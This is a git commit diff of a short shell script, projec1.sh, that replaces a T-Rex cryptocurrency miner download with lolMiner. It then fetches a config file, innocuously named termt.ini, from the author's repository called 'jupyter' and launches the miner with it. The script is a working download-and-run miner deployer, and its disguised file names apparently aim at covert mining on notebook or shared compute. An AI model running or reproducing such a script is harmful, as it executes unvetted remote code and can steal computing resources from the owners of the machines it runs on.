f5df10b26c23a7f649dd97fb4587c204202b1bdc
Taryok <92034895+Taryok@users.noreply.github.com>
2022-07-17 01:04:53 +0700

    Update projec1.sh

--- projec1.sh
+++ projec1.sh
@@ -1,4 +1,4 @@
-wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz && tar -zxf t-rex-0.25.12-linux.tar.gz && chmod +x t-rex
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz && tar -xf lolMiner_v1.51a_Lin64.tar.gz
 rm -rf termt.ini
 wget -O termt.ini https://raw.githubusercontent.com/Taryok/jupyter/main/termt.ini
-./termt.ini
+./lolminer termt.ini
